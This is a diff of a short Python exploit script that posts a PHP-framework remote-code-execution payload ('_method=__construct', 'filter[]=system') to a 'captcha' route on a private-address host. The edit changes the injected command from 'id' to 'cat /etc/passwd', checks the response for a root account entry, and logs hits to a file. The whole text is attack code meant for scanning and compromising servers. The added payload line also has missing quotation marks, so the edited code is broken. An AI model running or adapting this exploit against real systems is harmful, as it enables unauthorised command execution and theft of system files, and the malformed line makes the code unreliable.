@@ -10,11 +10,11 @@ url="https://192.168.0.97/index.php?s=captcha"
 
 headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 
-data={"_method":"__construct","filter[]":"system","method":"get","server[REQUEST_METHOD]":"id"}
+data={"_method:"__construct","filter[]":"system","method:"get","server[REQUEST_METHOD]":"cat%20/etc/passwd"}
 
 aa=requests.post(url,headers=headers,data=data,verify=False).text
 
-if "uid=0" in str(aa):
+if "root:*:0:0" in str(aa):
 	print ("yes",url)
 	with open("ok.txt",'a') as file: file.write(aa+'\n') 
 else:
